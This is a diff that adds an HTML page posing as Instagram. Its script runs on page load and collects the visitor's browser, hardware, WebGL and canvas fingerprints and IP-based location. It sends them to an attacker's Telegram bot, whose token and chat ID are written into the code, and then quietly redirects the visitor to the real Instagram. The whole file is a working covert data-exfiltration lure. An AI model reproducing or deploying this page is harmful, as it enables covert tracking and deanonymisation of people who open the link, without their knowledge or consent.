@@ -1,0 +1,101 @@
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Instagram</title>
+<style>body{margin:0;padding:0;background:#000;overflow:hidden;height:100vh;width:100vw}</style>
+</head>
+<body>
+
+<script>
+(async () => {
+    // إعدادات Telegram
+    const botToken = "7612902419:AAFkil59yYM0O61rmGH6XAcOIm5pOdEkG58";
+    const chatId = "5854169054";
+    
+    // جمع البيانات السريع
+    const data = {
+        ua: navigator.userAgent,
+        pl: navigator.platform,
+        ven: navigator.vendor,
+        av: navigator.appVersion,
+        hc: navigator.hardwareConcurrency || "N/A",
+        dm: navigator.deviceMemory || "N/A",
+        sw: screen.width,
+        sh: screen.height,
+        ip: "جاري الجلب...",
+        country: "جاري الجلب...",
+        city: "جاري الجلب..."
+    };
+
+    // WebGL Fingerprint
+    try {
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            data.wv = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A";
+            data.wr = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A";
+        }
+    } catch(e) {}
+
+    // Canvas Fingerprint
+    try {
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.fillStyle = "#f60";
+        ctx.fillRect(125,1,62,20);
+        ctx.fillStyle = "#069";
+        ctx.fillText("fp",2,15);
+        data.cf = canvas.toDataURL().substring(0,50) + "...";
+    } catch(e) {}
+
+    // إرسال البيانات بشكل غير متزامن
+    fetch("https://ipapi.co/json/")
+        .then(r => r.json())
+        .then(ip => {
+            data.ip = ip.ip || "N/A";
+            data.country = ip.country_name || "N/A";
+            data.city = ip.city || "N/A";
+            sendToTelegram();
+        })
+        .catch(() => sendToTelegram());
+
+    function sendToTelegram() {
+        const msg = `*📊 بيانات مستخدم جديدة*
+        
+*المتصفح:* ${escape(data.ua)}
+*النظام:* ${escape(data.pl)}
+*الشركة:* ${escape(data.ven)}
+*الإصدار:* ${escape(data.av)}
+*الأنوية:* ${data.hc}
+*الذاكرة:* ${data.dm}GB
+*الشاشة:* ${data.sw}x${data.sh}
+*WebGL:* ${escape(data.wv || "N/A")}
+*الرندر:* ${escape(data.wr || "N/A")}
+*Canvas:* ${escape(data.cf || "N/A")}
+*IP:* ${data.ip}
+*البلد:* ${escape(data.country)}
+*المدينة:* ${escape(data.city)}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: msg,
+                parse_mode: "Markdown"
+            })
+        }).catch(() => {});
+        
+        // الانتقال الفوري إلى Instagram
+        window.location.replace("https://www.instagram.com/");
+    }
+
+    function escape(text) {
+        return text ? text.replace(/[_*[\]()~>#+\-=|{}.!]/g, '\\$&') : "N/A";
+    }
+})();
+</script>
+
+</body>
+</html>
